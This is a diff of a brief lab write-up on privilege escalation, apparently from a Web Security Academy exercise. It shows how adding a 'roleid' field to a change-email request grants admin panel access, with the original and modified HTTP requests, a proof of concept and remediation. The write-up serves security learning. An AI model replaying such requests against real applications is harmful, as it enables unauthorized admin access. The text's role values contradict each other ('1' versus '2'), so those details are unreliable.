@@ -1,3 +1,51 @@
-Lab name: 'User role can be modified in user profile'.
+Title: privilege escalation to get admin panel acces.
+Summary: 
 
-Main porpose: Privilege escalation to get admin panel acces.
+Discovery Process:
+I tryed to do actions in the account, and chack the request to see if there is a parameters i can change, to get acces to the admin panel.
+When i change my email addres i sow the response send more parameters that wasn't in the original request.
+One of them was the parameter:'role'. It modifying to '1'.
+When i change it to '1' i get acces to the admin panel!
+
+Exploitation:
+I tested modifying the parameter 'role' identifier by modifying the request manually:
+
+Original request:
+POST /my-account/change-email HTTP/2
+Host: 0a8200ad043e8d398041c251003b00b9.web-security-academy.net
+...
+{
+"email":"secCheck@gmail.com"
+}
+
+Modified request:
+POST /my-account/change-email HTTP/2
+Host: 0a8200ad043e8d398041c251003b00b9.web-security-academy.net
+...
+{
+  "username": <"USER_NAME">,
+  "email": "secCheck@gmail.com",
+  "apikey":<"API_KEY">,
+  "roleid": 2
+}
+
+The server responded with 302 Found, and the role was successfully modifinding to '2'.
+
+Impact:
+The user have acces to the admin panel now!
+
+Root Cause:
+The web trust the user request and dont chack the user is how he say he is, and is permissions are leagals.
+
+Proof of Concept
+POST /my-account/change-email HTTP/2 {"email":"secCheck@gmail.com"} 
+→ HTTP/2 302 Found
+{"username": <"">,"email": <"">,"apikey": <"">,"roleid": 1}
+POST /my-account/change-email HTTP/2 {"username": <"">,"email": <"">,"apikey": <"">,"roleid": 2}
+→ HTTP/2 302 Found
+{"username": <"">,"email": <"">,"apikey": <"">,"roleid": 2}
+
+Remediation:
+Modifaying all the user that have permission to the admin panel,
+and in evry acount action the server-side checks for every user request,if is parameters much is permisions.
+
